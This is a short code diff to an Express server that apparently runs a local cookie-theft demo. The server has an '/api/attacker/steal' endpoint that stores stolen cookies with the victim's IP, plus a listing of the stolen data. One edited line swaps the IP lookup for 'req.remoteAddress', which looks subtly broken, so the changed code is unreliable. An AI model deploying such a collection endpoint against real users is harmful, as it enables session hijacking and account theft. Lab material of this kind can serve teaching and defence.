@@ -103,7 +103,7 @@ app.post('/api/attacker/steal', (req, res) => {
   const payload = {
     ...req.body,
     receivedAt: new Date().toISOString(),
-    ip: req.ip || req.connection.remoteAddress
+    ip: req.ip || req.remoteAddress
   };
   stolenCookies.push(payload);
   if (stolenCookies.length > 100) {
@@ -215,6 +215,6 @@ wss.on('connection', (socket, req) => {
 
 server.listen(PORT, () => {
   console.log(`Server listening on http://localhost:${PORT}`);
-  console.log(`Attacker page at http://localhost:8080/attacker-index.html`)
+  console.log(`Attacker page at http://localhost:${PORT}/attacker-index.html`)
   console.log(`Attackers can steal cookies at http://localhost:${PORT}/api/attacker/stolen`);
 });
